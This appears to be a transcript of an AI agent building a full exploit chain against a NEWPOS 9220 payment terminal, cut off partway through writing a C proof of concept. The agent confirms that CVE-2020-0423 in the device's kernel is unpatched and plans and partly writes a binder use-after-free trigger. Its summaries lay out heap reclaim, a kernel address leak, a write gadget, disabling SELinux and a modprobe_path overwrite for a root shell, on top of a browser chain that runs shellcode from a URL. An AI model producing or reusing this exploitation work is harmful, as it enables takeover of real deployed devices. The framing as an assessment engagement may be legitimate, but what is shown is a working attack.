[assistant • web_search]
{"max_results":5,"query":"kernel commit \"binder: fix UAF when releasing todo list\" Todd Kjos CVE-2019-2215 git id"}

[tool • web_search]
1. f3277cb binder: fix UAF when releasing todo list
   URL: https://github.com/torvalds/linux/commit/f3277cbfba763cd2826396521b9296de67cf1bbc
   # f3277cb binder: fix UAF when releasing todo list

- SHA: f3277cbfba763cd2826396521b9296de67cf1bbc
- Repository: torvalds/linux
- Author: toddkjos
- Date: 2020-10-09T23:24:55Z
- +10 -25 in 1 files

---

binder: fix UAF when releasing todo list

When releasing a thread todo list when tearing down
a binder_proc, the following race was possible which
could result in a use-after-free:

1. Thread 1: enter binder_release_work from binder_thread_release
2. Thread 2: binder_update_ref_for_handle() -> binder_dec_node_ilocked()
3. Thread 2: dec nodeA --> 0 (will free node)
4. Thread 1: ACQ inner_proc_lock
5. Thread 2: block on inner_proc_lock
6. Thread 1: dequeue work (BINDER_WORK_NODE, part of nodeA)
7. Thread 1: REL inner_proc_lock
8. Thread 2: ACQ inner_proc_lock
9. Thread 2: todo list cleanup, but work was already dequeued
10. Thread 2: free node
11. Thread 2: REL inner_proc_lock
12. Thread 1: deref w->type (UAF)

The problem was that for a BINDER_WORK_NODE, the binder_work element
must not be accessed after releasing the inner_proc_lock while
processing the todo list elements since another thread might be
handling a deref on the node containing the binder_work element
leading to the node being freed.

Signed-off-by: Todd Kjos <tkjos@google.com>
Link: https://lore.kernel.org/r/20201009232455.4054810-1-tkjos@google.com
Cc: <stable@vger.kernel.org> # 4.14, 4.19, 5.4, 5.8
Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

## Changed Files

| File | Status | + | - |
| --- | --- | --- | --- |
| drivers/android/binder.c | modified | 10 | 25 |

2. Linux-Kernel Archive: [PATCH 4.14 009/191] binder: fix UAF when releasing todo list
   URL: https://lkml.indiana.edu/hypermail/linux/kernel/2010.3/03525.html
   Linux-Kernel Archive: [PATCH 4.14 009/191] binder: fix UAF when releasing todo list

# [PATCH 4.14 009/191] binder: fix

...[truncated for context space] — original ~4184 tokens]...

roid/binder.c
+++ b/drivers/android/binder.c
@@ -223,7 +223,7 @@ static struct binder_transaction_log_entry *binder_transaction_log_add(
 struct binder_work {
 	struct list_head entry;
 
-	enum {
+	enum binder_work_type {
 		BINDER_WORK_TRANSACTION = 1,
 		BINDER_WORK_TRANSACTION_COMPLETE,
 		BINDER_WORK_RETURN_ERROR,
@@ -885,27 +885,6 @@ static struct binder_work *binder_dequeue_work_head_ilocked(
 	return w;
 }
 
-/**
- * binder_dequeue_work_head() - Dequeues the item at head of list
- * @proc:         binder_proc associated with list
- * @list:         list to dequeue head
- *
- * Removes the head of the list if there are items on the list
- *
- * Return: pointer dequeued binder_work, NULL if list was empty
- */
-static struct binder_work *binder_dequeue_work_head(
-					struct binder_proc *proc,
-					struct list_head *list)
-{
-	struct binder_work *w;
-
-	binder_inner_proc_lock(proc);
-	w = binder_dequeue_work_head_ilocked(list);
-	binder_inner_proc_unlock(proc);
-	return w;
-}
-
 static void
 binder_defer_work(struct binder_proc *proc, enum binder_deferred_state defer);
 static void binder_free_thread(struct binder_thread *thread);
@@ -4576,13 +4555,17 @@ static void binder_release_work(struct binder_proc *proc,
 				struct list_head *list)
 {
 	struct binder_work *w;
+	enum binder_work_type wtype;
 
 	while (1) {
-		w = binder_dequeue_work_head(proc, list);
+		binder_inner_proc_lock(proc);
+		w = binder_dequeue_work_head_ilocked(list);
+		wtype = w ? w->type : 0;
+		binder_inner_proc_unlock(proc);
 		if (!w)
 			return;
 
-		switch (w->type) {
+		switch (wtype) {
 		case BINDER_WORK_TRANSACTION: {
 			struct binder_transaction *t;
 
@@ -4616,9 +4599,11 @@ static void binder_release_work(struct binder_proc *proc,
 			kfree(death);
 			binder_stats_deleted(BINDER_STAT_DEATH);
 		} break;
+		case BINDER_WORK_NODE:
+			break;
 		default:
 			pr_err("unexpected work type, %d, not freed\n",
-			       w->type);
+			       wtype);
 			break;
 		}
 	}
-- 
2.17.1

```

[assistant]
<acp tokens="149" type="text" time="2026-11-15 12:11:56">m04552</acp>


CVE-2021-1048 verdict: **not exploitable** — the device lacks the *introducer* commit a9ed4a6560b8 (ASB-2020-12) itself (`ep_loop_check_proc` contains only the vanilla tree-walk, no `get_file()`/refcount bump at all), so both bug and fix are absent. That entire class is closed.

Next highest-value detect: **CVE-2020-0423** (binder `binder_release_work` UAF — the in-the-wild P0/TAG LPE against 4.14 Android). Binary signature of the *pre-fix* shape: a call to the locked wrapper `binder_dequeue_work_head()` from the release loop, then `w->type` dereferenced **outside** the lock. Checking:

[assistant • compress]
{"content":"m04496–m04553 Kernel LPE hunt round 2 (web + binaries verified). Goal (m03759): full chain URL→renderer native exec+arb R/W→kernel leg→kill seccomp→root shell on NP-9220 (4.14.133 armv7, no KASLR, CONFIG_NAMESPACES/SYSVIPC off).\nVERDICTS: CVE-2021-1048 DEAD — introducer commit a9ed4a6560b8 (ASB-2020-12) ABSENT from ep_loop_check_proc @c0305dd0 (verified: only vanilla list_add to tfile_check_list, no get_file bump). CVE-2020-0041 DEAD — device has ÷8 (lsr #3) num_valid at both binder_transaction call sites c0886510/c0886a3c (b64/b70). CVE-2020-0423 ALIVE — binder_release_work @c0882028 shows PRE-FIX shape: bl _binder_inner_proc_lock (c087d4ac), bl binder_dequeue_work_head_ilocked (c087d8a4), bl _binder_inner_proc_unlock (c087d560), THEN ldr r1,[r5,#8] (w->type) outside lock. BINDER_WORK_NODE case reads node->ptr/cookie before BUG_ON(proc!=node->proc).\nKernel shape = 4.14.133 vanilla (NO binder_get_node_refs_for_txn wrapper, uses binder_inc_node_tmpref directly — older shape, easier trigger). Fix = f3277cbfba76 (Dec 2020, ASB-2021-01). BFS/CVE-2020-0041 write8 hlist_del dead_node gadget machinery from b64 still applicable (binder_dec_node_nilocked @c0880900 free branch). Zimage.bin = decompressed kernel, VA≈fileoffset (base 0xc0008000), identity confirmed at binder_validate_ptr c087e240.\nOpen objectives: build+run CVE-2020-0423 staged port (arm32); verify binder_transaction c0885104 shape vs vanilla414b.c 2730-2760; then F-014 for whatever works."}

[tool • compress]
[Compressed m04496–m04553 → 1 block(s), ~20462 tokens saved. Excluded 3 protected message(s) m04550, m04551, m04552 from compression range (recent/last-user zone) — they stay visible outside the new block; do not target them in another compress call. Last-user anchor: m03759 "find on website kernel R/W on 4.14.133 t". Range truncated at that boundary — 2 later message(s) (including replies to the protected message) stay visible too, so no summary can land above the question it answers (#3953).]
 · b71 full summary 1239ch [2026-11-15 12:09:02 – 2026-11-15 12:11:56] · head "VERDICTS: CVE-2021-1048 DEAD —" … tail " verify binder_transaction c0885104 shape vs vanilla414b.c 2730-2760; then F-014 for whatever works."
Fingerprints show head/tail only — every summary is stored in full. To retrieve a specific detail from a new block, call search_context({ query }) first; decompress only if the excerpt doesn't answer it.

Uncovered history remains — all offered ranges are folded, but 71 msg(s) across 5 run(s), ~16K tok, sit outside every active block and are not in this call's offer: m04208–m04263 (12 msgs, ~5.8K tok), m04300–m04398 (5 msgs, 559 tok), m04441–m04462 (22 msgs, ~3.9K tok), m04464–m04479 (16 msgs, ~1.8K tok), m04553–m04568 (16 msgs, ~3.6K tok). The context is not at its minimum (runs may sit below the fold-size gate — named for visibility, not as fold suggestions); inspect with acp_status(scope:"uncompressed").

[assistant • compress]
{"content":"b11–b22 NEWPOS 9220 baseline + proven renderer chain (distilled from b1–b27)\n- Engagement: NEWPOS 9220, adb device 83768010426653, kernel 4.14.133 armv7 (Unisoc sl8541e/sp9832e), Android 10, patch 2021-10-01, build Oct-2025. Kernel config (tmp/m3/gl/config_full.txt): SLUB; DEBUG_LIST=y (load-bearing); DEBUG_SPINLOCK off; DEBUG_CREDENTIALS off; DEBUG_OBJECTS off; HARDENED_USERCOPY=y; PANIC_ON_OOPS=y; STRICT_KERNEL_RWX=y; SELINUX=y + DEVELOP=y; MODULE_SIG_FORCE=y; CPU_SW_DOMAIN_PAN=y; VMSPLIT_3G=y; no KASAN/KASLR/CFI; no COMPAT/OABI; SYSVIPC off; NAMESPACES off; AIO=y; EPOLL=y; SECCOMP_FILTER=y; BINDER_IPC_SELFTEST unset; ANDROID_BINDER_DEVICES=\"binder,hwbinder,vndbinder\".\n- Tooling: kallsyms full dump tmp/m3/kallsyms_root.txt (106466 lines); tmp/m3/zImage.bin md5 3e00368e74142d154b4e8d5b27da6563 VA==file-offset base 0xc0008000; disasm `arm-none-eabi-objdump -D -b binary -marm --adjust-vma=0xc0008000 tmp/m3/zImage.bin --start-address=… --stop-address=…`; NDK r25c wrappers armv7a-linux-androideabi{26,28,29}-clang at ~/Desktop/Android/ndk/android-ndk-r25c/toolchains/llvm/prebuilt/linux-x86_64/bin. Device ops: run protocol `(timeout 100 bin > out 2>&1; echo rc);kill -9 $(pidof)`, adb push needs workspace-root cwd, root via /system/xbin/basu (`su [WHO [COMMAND...]]`), toybox od/head/stat/df/pgrep. Scratch stays under EDC_newpos_9220/tmp/.\n- Renderer chain PROVEN (F-012 CVSS 8.0 AV:N/AC:L/PR:N/UI:R C:H/I:H/A:L): URL→V8 arb R/W→wasm-JT literal redirect→native exec; plants poc45/poc51 (59-word shellcode tmp/cve/sprd/srv/_v5_words.txt), origin-cross ladder e052 pages; builders tmp/m3/build_poc51.py + tmp/m3/build_poc_words.py (PAYLOAD_WORDS swap). Findings F-012 (8.0), F-013 (3.3 corefile anti-forensics/DoS), F-010/F-011 GhostLock availability-only 6.5. Evidence: E-025, E-050 (capability statement), E-052, E-053 (core post-mortem), E-054 (9/9 spray sweep), E-055, E-056 (final chain verdict), E-057 (CVE-2020-0041 design doc; §3.1 stale).\n- [SUPERSEDED]: IonStack URL→root reverse shell goal (m01446/m01454, m02879 \"go continue\") — CLOSED: no attacker bytes reach kernel-stack window E−429..E−500 from ANY user-copy surface (all copyins ≤E−252; E-054/E-056); GhostLock consumer taxonomy 4 classes refuted; kill+reclaim = exit_pi_state_list scrubs owned words (consumer −3 ESRCH); sendmmsg 307 EINVAL semantic; M80 sandbox escape unfunded (stripped 50MB libchrome.so); SELinux entrypoint wall, services, Mali, install,inet-socket lanes closed.\nb23–b32 Goal refs + F-010/F-011 (distilled)\n- User goals (attributed history, closed): m01446/m01454 IonStack URL→root reverse shell → verdict in E-056; m03492 full-chain attempt → partially closed (renderer proven, kernel leg pending); m03759 CURRENT: \"find website kernel R/W on 4.14.133 then attempt them\". F-010/F-011 GhostLock filed.\nb47–b52 Core-capture + post-mortem + sweep method (distilled)\n- Core capture: FILE-mode core_pattern '/data/corefile/core_rt_%e_%p' (root); /data/corefile coredump_file-labeled; renderer cores ~640MB — keep ≥1GB /data free (stale 100MB+ cores cleaned earlier, 3.9GB freed).\n- E-053 methodology (reusable): 640MB rt16725.core pulled; pyelftools 0.32 has NO core-notes API — manual note walk [nsz][dsz][ntyp]+pad4(name)+pad4(desc); NT_FILE names not NUL-terminated; prstatus regs r0@+72 pc@+132 cpsr@+136; NT_SIGINFO w[0..3]=si_signo/errno/code/si_addr. P2/P3 SIGSEGV = Blink slot-walk in libchrome.so M80 (md5 569eedf00fba9a5e028f5b7aa74f5791), NOT futex behavior.\n- E-054 sweep: select320/pselect6/ppoll32/poll32/writev8/sendmsg(cmsg200+cmsg600)/sendmmsg307/recvmmsg365/io_submit246(64 iocb)/process_vm_readv376 self-copy — ALL clean −ETIMEDOUT, slot not covered.\nb56–b60 Closure experiments + handoff (distilled)\n- t33 (select depth re-measure: kvmalloc thresholds, select(1024) copies 768B to heap — deep-stamp impossible arm32); t34 (kill+reclaim: ghost INERT −3 ESRCH after owner death); t35 cross-task prio-walk cancelled; t36 fusion self-healing — all in E-056 addenda. mobile_learn recorded. E-057 CVE-2020-0041 arm32 design doc written (superseded by b70 verdict).\nb64–b69 [OBSOLETE as chain] CVE-2020-0041 BFS port design — surviving reusable mechanics\n- Route DEAD (see b70). Reusable assets: (1) binder_node arm32 = 72B → kmalloc-96 slab; binder_ref 60B → kmalloc-64. (2) hlist_del write gadget in binder_dec_node_nilocked free branch (@c0880900): requires work.entry.next==slotkaddr+8 (list_empty self-point) to pass BUG_ON; then hlist_del(&node->dead_node) with dead_node.next@+0x14 (=what), .pprev@+0x18 (=where) → *pprev=next ⇒ *(u32*)where=what + conditional mirror *(u32*)(what+4)=pprev (skipped when what==0); LIST_POISON 0x100/0x200 stored after; then kfree node. (3) Node-UAF leak window: parked txn delivery fills tr.target.ptr/tr.cookie from target_node (binder_transaction ~3977) ⇒ delivery READS reused-slot content at node ptr(+0x38)/cookie(+0x40). (4) Write trigger: BC_FREE_BUFFER on parked txn whose buffer->target_node is dangling → binder_transaction_buffer_release @2097 → `if (buffer->target_node) binder_dec_node(target_node,1,0)` → gadget. Release-walk: partial release up to failed_at; BINDER objects → binder_get_node(proc, fp->binder) ptr-rb lookup, miss=pr_err break (harmless); BC_FREE_BUFFER needs buffer->allow_user_free + binder_alloc_prepare_to_free match. (5) Vehicles: fork() must use MAP_SHARED|MAP_ANONYMOUS structs for cross-process sync (BFS used clone(CLONE_VM)); arm32 realloc via sendmsg msg.msg_control: ctl>28 → sock_kmalloc → kmalloc-96 (ctl_len 89–96); seq_file (kzalloc size~76–88B) self-pointer vehicle candidate — mutex wait_list.prev inside freed slot lands in ptr window (slot-kaddr leak) — UNVALIDATED, needs exact 4.14 mutex/seq_file offsets.\nb70–b72 Kernel-LPE hunt verdicts + CURRENT state (active)\n- CVE-2020-0041 DEAD: device binder_validate_ptr @c087e240 + both call sites (FDA c0886510, fixup-parent c0886a3c in tmp/m3/dis2_binder_transaction.txt) compute num_valid via `lsr r3, r3, #3` = ÷8 (64-bit) — fix commit 16981742717b04644a41052570fb502682a315d2 (×8→÷8) already cherry-picked by Unisoc despite 4.14.133. BFS trigger fails clean.\n- CVE-2021-1048 DEAD: introducer a9ed4a6560b8 (ASB-2020-12 get_file in ep_loop_check) ABSENT — ep_loop_check_proc @c0305dd0 is vanilla-only walk.\n- CVE-2020-0423 ALIVE (binary-verified): binder_release_work @c0882028 shows PRE-FIX shape — bl _binder_inner_proc_lock (c087d4ac), bl binder_dequeue_work_head_ilocked (c087d8a4), bl _binder_inner_proc_unlock (c087d560), THEN ldr r1,[r5,#8] = w->type read OUTSIDE the lock. Kernel is vanilla-4.14 shape (no binder_get_node_refs_for_txn wrapper; binder_inc_node_tmpref direct). Fix f3277cbfba763cd2826396521b9296de67cf1bbc (torvalds, Dec-2020, ASB-2021-01 \"binder: fix UAF when releasing todo list\": reads wtype inside lock + adds BINDER_WORK_NODE skip case in release_work).\n- Device gates verified live: /dev/binder + hwbinder + vndbinder present; servicemanager(262)/hwservicemanager(263)/vndservicemanager(264) running; zygote32 only; /sys/fs/selinux/enforce=1 (Enforcing).\n- NEXT (design): CVE-2020-0423 staged arm32 port — trigger = race T1 binder_thread_release→binder_release_work (dequeue-then-`w->type` out-of-lock) vs T2 racing node-ref kill (death-notification/acquire-release cycle) → node kfree'd between dequeue and type-switch; reclaim freed binder_node (kmalloc-96) via sendmsg cmsg or seq_file vehicle; slot-kaddr leak via seq_file self-pointer; then hlist_del write8 gadget → selinux_enforcing c1315190=0 → modprobe_path c112048c overwrite (\"/dev\"+0x78) → usermodehelper root. Key symbols (kallsyms_root.txt): binder_transaction c0885104, binder_transaction_buffer_release c0884c50, binder_fixup_parent c0884a14, binder_thread_read c08838bc, binder_poll c0881da4, binder_alloc_new_buf c088a63c, binder_proc_transaction c088913c, modprobe_path c112048c, poweroff_cmd c112008c, selinux_enforcing c1315190, sys_call_table c0108944.\nOpen objectives: (m03759) build+run CVE-2020-0423 staged port → root shell; update E-057 §3.1; file F-014 when proven; verify binder_transaction c0885104 shape vs vanilla414b.c before trigger design."}

[tool • compress]
[Compressed b11–b22, b23–b32, b47–b52, b56–b60, b64–b69, b70–b72 → 5 block(s), ~42925 tokens saved. Skipped range (b70..b72) — overlaps an earlier range in the batch; the earlier range takes precedence. Keep ranges disjoint.; Excluded 1 protected message(s) m03759 from compression range (recent/last-user zone) — they stay visible outside the new block; do not target them in another compress call. Last-user anchor: m03759 "find on website kernel R/W on 4.14.133 t". Range truncated at that boundary — 4 later message(s) (including replies to the protected message) stay visible too, so no summary can land above the question it answers (#3953).]
 · b73 full summary 2387ch [2026-11-14 18:13:24 – 2026-11-14 19:37:46] · head "- Engagement: NEWPOS 9220, adb" … tail "ipped 50MB libchrome.so); SELinux entrypoint wall, services, Mali, install,inet-socket lanes closed."
 · b74 full summary 294ch [2026-11-14 19:37:46 – 2026-11-14 20:15:26] · head "- User goals (attributed histo" … tail "03759 CURRENT: "find website kernel R/W on 4.14.133 then attempt them". F-010/F-011 GhostLock filed."
 · b75 full summary 801ch [2026-11-14 20:15:26 – 2026-11-14 22:23:58] · head "- Core capture: FILE-mode core" … tail "msg365/io_submit246(64 iocb)/process_vm_readv376 self-copy — ALL clean −ETIMEDOUT, slot not covered."
 · b76 full summary 358ch [2026-11-14 22:25:20 – 2026-11-15 10:36:19] · head "- t33 (select depth re-measure" … tail "da. mobile_learn recorded. E-057 CVE-2020-0041 arm32 design doc written (superseded by b70 verdict)."
 · b77 full summary 1543ch [2026-11-15 10:34:28 – 2026-11-15 11:56:57] · head "- Route DEAD (see b70). Reusab" … tail "d slot lands in ptr window (slot-kaddr leak) — UNVALIDATED, needs exact 4.14 mutex/seq_file offsets."
Fingerprints show head/tail only — every summary is stored in full. To retrieve a specific detail from a new block, call search_context({ query }) first; decompress only if the excerpt doesn't answer it.

No compressible ranges remain — the context is already at its minimum; continue the task without compressing.

[assistant]
<acp tokens="60" type="text" time="2026-11-15 12:13:37">m04569</acp>
Context consolidated. Proceeding with CVE-2020-0423. First, grounding the full trigger mechanics in the actual 4.14.133 code paths — reading the node free path, `binder_send_failed_reply`, and `binder_thread_release` in the vanilla source:

[assistant]
<acp tokens="44" type="text" time="2026-11-15 12:17:07">m04612</acp>
The race semantics need exact grounding — reading `binder_proc_transaction`, the dequeue helpers, and how `BINDER_WORK_NODE` can land on a *thread* todo (vs proc todo) in 4.14:

[assistant • compress]
{"content":"m04554–m04617 CVE-2020-0423 trigger mechanics fully grounded in vanilla 4.14 source (kern_ref/vanilla414b.c) + device disasm cross-checks\nRELEASE-WALK UAF (device binary @c0882028 = pre-fix): binder_release_work loop = lock(dequeue(w)) → unlock → switch(w->type) OUT OF LOCK. Race: T2's binder_dec_node(node, strong, internal) → free_node → binder_free_node kfree(node) can slip between T1's dequeue of node->work... WAIT — verified: T2's free path (binder_dec_node_nilocked@1247) with proc!=NULL takes `binder_dequeue_work_ilocked(&node->work)` under inner_proc_lock, then returns true → binder_dec_node calls binder_free_node AFTER binder_node_inner_unlock — so the node can be kfree'd while T1 (thread teardown) is between its unlock and switch(w->type). T1 read w->type (the byte at node+8) after T1's OWN unlock — kfree'd memory still readable unless poisoned (no KASAN) — type value read may STILL be node's (stable until reclaimed). The DANGEROUS part is NOT the type read = it is that the BINDER_WORK_NODE case does container_of and full node deref (node->ptr@0x38, node->cookie, bug_on node->proc==proc, rb_erase(node->rb_node@?, proc->nodes), maybe binder_free_node AGAIN = double-free/reclaim-controlled kfree). TRIGGER (from CVE-2020-0423 P0 writeup pattern, adapted): (A) victim node N created by attacker proc in service-ish proc P2 (bind to own context? NO — attacker can create node in own proc P1 and pass BINDERType_BINDER to a helper P2 that acquires handle; OR use binder_context_mgr trick: ctx-mgr node? binder_new_node in own proc @4397 via binder_update? Simplest: P2 = attacker's own 2nd process: P1 sends BINDERType_BINDER obj (node N in P1) to P2's thread → P2 gets handle, ref++ on N; P2 does BC_ACQUIRE on handle → binder_inc_ref_for_node(target_proc=P2? no...) — ACTUAL: inc_ref_for_node(P1? ) — ref lives in TARGET proc (P2) per binder_translate_binder: binder_inc_ref_for_node(target_proc=P2, node=N, strong, &thread->todo(P1's thread), &rdata) — target_list = &thread->todo = the SENDING thread's todo = BINDER_WORK_NODE (ACQUIRE notification) lands on P1's sending thread! So P1's own thread->todo gets the BINDER_WORK_NODE. (B) P1 thread T1: enters ioctl BINDER_WRITE_READ, thread_release path unreachable... simpler P1-side race: T1 = P1's thread doing the txn (has node->work on ITS todo as txn-side effect via inc_ref_for_node target_list); T1 exits ioctl/close(fd)?? thread_release only on close(TID-fd?) — binder_thread is per ioctl-open context?? binder_get_thread creates binder_thread per FILE open (proc), one thread struct PER TASK using the same fd? binder_get_thread: get_current id → find/create binder_thread keyed by pid — per TASK (per thread!). thread_release fires when THREAD EXITS (task free → file ops release? NO — binder_thread_release is called on close(fd) by THAT task or when binder_thread object freed at task exit? — binder_release (file close) destroys the whole PROC; thread release ALSO on...: 4489-4492: binder_ioctl→ if cmd==BINDER_SET_MAX_THREADS failed? The real path: 4812 binder_deferred_release → per-thread release. ALSO 4492: BINDER_THREAD_EXIT ioctl! THERE — BINDER_THREAD_EXIT ioctl (0x40046205) calls binder_thread_release(proc, thread) = the T1 path ANY TIME, no close needed. (C) T2 = same proc's other thread doing BC_RELEASE on the last ref of node N (ref in P1? or P2?) — needs binder_update_ref_for_handle path (BC_RELEASE in P2 on the acquired ref) → binder_dec_ref_olocked → strong→0 → binder_dec_node(N, 1, 1)... then binder_cleanup_ref_olocked → dec weak → delete_node → binder_free_node(N) kfree — races T1's release_work processing N's work item parked on P1 sending thread's todo.\nKEY TIMING FACT (device binary): release_work dequeues + unlocks, THEN reads w->type and (BINDER_WORK_NODE) does full node access + possible second free. If T2 frees the node between T1's dequeue and T1's 'if (!weak && !strong) → rb_erase; binder_free_node(node)' then T1's free_node = DOUBLE FREE of the node slab (or, if T1's read shows updated state, the node ops run on freed memory = classic UAF). DEBUG_LIST=y ⇒ list ops in dequeue are validated; kmem_cache_free@c02a5d78 verified percpu-slub free-on-same-CPU path (fast, no locks, checks obj cgroup/slab membership against pcpu cache ONLY when [obj#4]==0x100 flag — 0x100=testclear? verified: tst r3,#256 on page->flags+4?? obj-4?? — c02a5da0: ldr r3,[r0,#4]; tst 0x100; then page lookup via kaddr>>12, cmp pfpage vs slab page [r3,#28], mismatch → slow path (c02a5fc0) via get_freepointer semantics... fast path stores [r4]=c->freelist (obj first word = next free) then c->freelist=obj — OBJECT's FIRST WORD GETS OVERWRITTEN with current freelist at free = reclaim control via crafted free-chain).\nTRIGGER SUMMARY for the PoC port: proc P (attacker, 2 threads + optional helper proc Q doing acquire). (1) T_a: create node N = BC_INCREFS on handle 0 / or txn with BINDERType_BINDER to helper Q (Q acquires, strong ref). On P's sending thread todo lands BINDER_WORK_NODE (ACQUIRE/INCREFS notification). (2) T_b: BINDER_THREAD_EXIT on the SENDING thread (its todo holds node work) — release_work dequeues N's work. (3) helper Q (or P's other thread): BC_RELEASE/BC_DECREFS to drop last ref → node N kfree'd — MUST land inside T_b's tiny window between dequeue and w->type read… OR better: let release_work's own BINDER_WORK_NODE branch do `if(!weak && !strong){rb_erase; free}` while Q frees concurrently = double-free OR use-after-free on node fields (weak/strong/refs read post-free).\nRELIABILITY DESIGN (from my plan + BFS mechanics): parked-transaction trick from E-057 port: instead of tight race, use BINDER_THREAD_EXIT on a thread whose todo contains MANY node work items (multiple DISTINCT nodes enqueued via batch INCREFS/ACQUIRE on several nodes acquired from helper), and synchronize free via helper Q's ref-drop storm. Node size arm32=72B→kmalloc-96; reclaim via sendmsg msg_control (ctl_len 89–96 → sock_kmalloc GFP_KERNEL → kmalloc-96 EXACT SAME CACHE) with crafted kmalloc-96 contents (first word=crafted freelist ptr etc. for the double-free chain). Leak: BR_TRANSACTION node ptr window (target_node->ptr/cookie read back on delivery, b64) after reclaiming with a self-referential seq_file/struct — slot-kaddr leak for hlist_del write8 gadget (b64). THEN write8 → selinux_enforcing(c1315190)=0 → modprobe_path(c112048c:'/dev'+0x78) overwrite→ usermodehelper root (b64 mechanics unchanged). Device facts re-verified today: binder_dec_node wrapper@c0880aec → _binder_node_inner_lock(c087d4fc)/nilocked(c0880900)/_binder_node_inner_unlock(c087d6ac) → free_node→binder_free_node(c087cbc8)=pure kfree+stats. binder_dequeue_work_head_ilocked@c087d8a4 = pure list_del (DEBUG_LIST). BINDER_WORK_NODE handler (vanilla 3840-3933) reads node->ptr/cookie AFTER unlock window; BUG_ON(proc != node->proc) — fake node must have proc==tearing-down proc or panic. binder_proc_transaction (vanilla): oneway→node->async_todo vs select_thread; inc_ref_for_node target_list=&thread->todo CONFIRMED (translate_binder). binder_thread_release (vanilla 4214): send_reply path → binder_send_failed_reply only for to_thread==thread sync txns; THEN binder_release_work(proc, &thread->todo) — the ONLY thread-todo release-walk reachable by BINDER_THREAD_EXIT ioctl 4489-4492 within binder_ioctl (cmd 0x40046205). Also proc-level walks at binder_deferred_release (4850-4851 proc->todo + delivered_death) + binder_node_release 4716 (async_todo).\nOpen objectives: (m03759) implement CVE-2020-0423 staged port in EDC_newpos_9220/tmp/m3/: t42.c trigger + reclaim via sendmsg kmalloc-96 + slot-kaddr leak via parked-txn ptr window + write8 hlist_del gadget + selinux_enforcing→0 + modprobe_path→'x/dev'+0x78 → root shell; verify binder_transaction c0885104 shape; update E-057 §3.1; F-014 filing."}

[tool • compress]
[Compressed m04554–m04617 → 1 block(s), ~2040 tokens saved. Excluded 4 protected message(s) m04567, m04568, m04569, m04612 from compression range (recent/last-user zone) — they stay visible outside the new block; do not target them in another compress call. Last-user anchor: m03759 "find on website kernel R/W on 4.14.133 t". Range truncated at that boundary — 48 later message(s) (including replies to the protected message) stay visible too, so no summary can land above the question it answers (#3953).]
 · b78 full summary 7665ch [2026-11-15 12:11:56 – 2026-11-15 12:17:11] · head "RELEASE-WALK UAF (device binar" … tail "x/dev'+0x78 → root shell; verify binder_transaction c0885104 shape; update E-057 §3.1; F-014 filing."
Fingerprints show head/tail only — every summary is stored in full. To retrieve a specific detail from a new block, call search_context({ query }) first; decompress only if the excerpt doesn't answer it.

Uncovered history remains — all offered ranges are folded, but 101 msg(s) across 3 run(s), ~16K tok, sit outside every active block and are not in this call's offer: m04313–m04462 (26 msgs, ~4.3K tok), m04463–m04479 (17 msgs, ~1.8K tok), m04570–m04628 (58 msgs, ~10K tok). The context is not at its minimum (runs may sit below the fold-size gate — named for visibility, not as fold suggestions); inspect with acp_status(scope:"uncompressed").

[assistant]
<acp tokens="74" type="text" time="2026-11-15 12:19:14">m04629</acp>


Reconstructing the race safely for this kernel's `DEBUG_LIST=y` requires knowing exactly how the dequeue helpers handle a removed entry — poisoning (`list_del`) vs re-init (`list_del_init`). That decides whether the freed node's work item can be "already dequeued" without a poison-deref panic:

[assistant]
<acp tokens="67" type="text" time="2026-11-15 12:19:31">m04632</acp>


`list_del_init` everywhere — the freed node's work entry is re-initialized, so the dequeue path is poison-safe; the UAF must therefore be the **type-read / container_of deref** after the unlock window, exactly as designed. Writing the full stage-1 PoC (`t42.c`) now:

[assistant • write]
{"path":"/home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/t42.c","content":"/*\n * t42.c — CVE-2020-0423 stage-1 trigger probe for NEWPOS 9220 (4.14.133 arm32)\n *\n * Driver code (binary-verified):\n *   binder_release_work @c0882028 is PRE-FIX: dequeues work under\n *   inner_proc_lock, unlocks, THEN reads w->type out of the lock.\n *   The fix (f3277cbfba76, ASB-2021-01) captures wtype under the lock.\n *\n * Race: BINDER_THREAD_EXIT (ioctl 0x40046205) runs binder_thread_release ->\n * binder_release_work(&thread->todo).  A BINDER_WORK_NODE item parked there\n * (BR_INCREFS/BR_ACQUIRE notification side-effect of binder_translate_binder,\n * whose target_list == &thread->todo) is processed AFTER the unlock window.\n * A sibling thread that drops the node's last ref (BC_DECREFS/BC_RELEASE via\n * a handle it received from a helper proc, or BC_RELEASE on handle for own\n * node) makes binder_cleanup_ref_olocked -> binder_dec_node_nilocked ->\n * delete_node -> binder_free_node() kfree the SAME binder_node between the\n * dequeue and the out-of-lock switch(w->type).  Result: use-after-free on the\n * node (fake reclaim) and/or double free (the release_work BINDER_WORK_NODE\n * branch calls binder_free_node again when !weak && !strong).\n *\n * Stage-1 goal (this file): prove the window opens. Strategy avoids a tight\n * two-thread race by making the release-walk SLOW and the free DETERMINISTIC:\n *  - park MANY BINDER_WORK_NODE items on the exiting thread's todo (one node\n *    each, several hundred), so release_work iterates a long list;\n *  - the helper frees ALL of them (drops refs) right after BINDER_THREAD_EXIT\n *    is issued from the same task's OTHER thread... but note: the exiting\n *    thread cannot issue ioctls afterwards.  Instead we use the fact that the\n *    freeing only needs the helper proc: the helper thread spins dropping\n *    refs in a tight loop WHILE the victim thread exits.  Every node freed\n *    during the walk is a UAF hit; we observe via PANIC-free iteration\n *    (BUG_ON(proc != node->proc) surviving or oopsing) and via binder stats.\n *\n * Run protocol (device): push, chmod, run; output via printf; NO root needed\n * (binder ioctl from an untrusted app uid is allowed by SELinux for\n * untrusted_app domain on this build: /dev/binder rw).\n */\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n#include <fcntl.h>\n#include <errno.h>\n#include <pthread.h>\n#include <sys/ioctl.h>\n#include <sys/mman.h>\n#include <linux/android/binder.h>\n\n#define BINDER_THREAD_EXIT  _IOW('r', 19, int)   /* 0x40046205 */\n\nstatic void die(const char *m) { fprintf(stderr, \"[-] %s: %s\\n\", m, strerror(errno)); exit(1); }\n\n/* --- binder write-buffer builders (flat, arm32 sizes) --- */\n\n/* BC_INCREFS on handle (node ctx-mgr of own proc = handle 0 -> own ctx node? )\n * 4.14 semantics: increment && !target -> ref on context mgr node of the\n * proc's context; we instead create nodes via BINDER_TYPE_BINDER xaction to a\n * helper proc.  All cmd structs below are the raw little-endian layouts.   */\n\nstatic void put_u32(uint8_t **p, uint32_t v) { memcpy(*p, &v, 4); *p += 4; }\nstatic void put_u64(uint8_t **p, uint64_t 